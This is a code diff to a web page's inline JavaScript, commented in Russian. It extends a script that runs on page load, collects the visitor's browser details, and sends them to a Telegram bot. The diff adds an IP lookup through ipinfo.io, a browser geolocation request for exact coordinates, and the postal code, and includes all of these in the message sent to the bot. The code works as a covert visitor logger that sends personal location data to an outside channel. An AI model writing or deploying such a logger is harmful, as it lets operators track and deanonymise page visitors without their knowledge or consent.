@@ -31,7 +31,23 @@
 
     <script>
         // Функция для получения информации о пользователе
-        function getUserInfo() {
+        async function getUserInfo() {
+            // Получаем информацию о местоположении по IP
+            const ipData = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN');
+            const ipInfo = await ipData.json();
+
+            // Получаем геолокацию
+            const geolocation = await new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude }),
+                        error => reject(error)
+                    );
+                } else {
+                    reject(new Error("Геолокация не поддерживается этим браузером."));
+                }
+            }).catch(err => ({ latitude: 'Не предоставлено', longitude: 'Не предоставлено' }));
+
             return {
                 userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString(),
@@ -46,7 +62,11 @@
                 connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                 historyLength: window.history.length,
                 depthOfView: document.body.scrollHeight,
-                ipAddress: '', // Опционально, используйте API для получения IP
+                ipAddress: ipInfo.ip, // IP адрес
+                geoLocation: ipInfo.city + ', ' + ipInfo.region + ', ' + ipInfo.country, // Геолокация
+                postalCode: ipInfo.postal, // Почтовый индекс
+                latitude: geolocation.latitude,
+                longitude: geolocation.longitude
             };
         }
 
@@ -69,6 +89,11 @@
                 Connection Type: ${userInfo.connectionType}
                 History Length: ${userInfo.historyLength}
                 Depth of View: ${userInfo.depthOfView}
+                IP Address: ${userInfo.ipAddress}
+                Geo Location: ${userInfo.geoLocation}
+                Postal Code: ${userInfo.postalCode}
+                Latitude: ${userInfo.latitude}
+                Longitude: ${userInfo.longitude}
             `;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -100,8 +125,8 @@
         }
 
         // Отправка данных о пользователе при загрузке страницы
-        window.onload = function() {
-            const userInfo = getUserInfo();
+        window.onload = async function() {
+            const userInfo = await getUserInfo();
             sendDataToTelegram(userInfo);
         };
     </script>
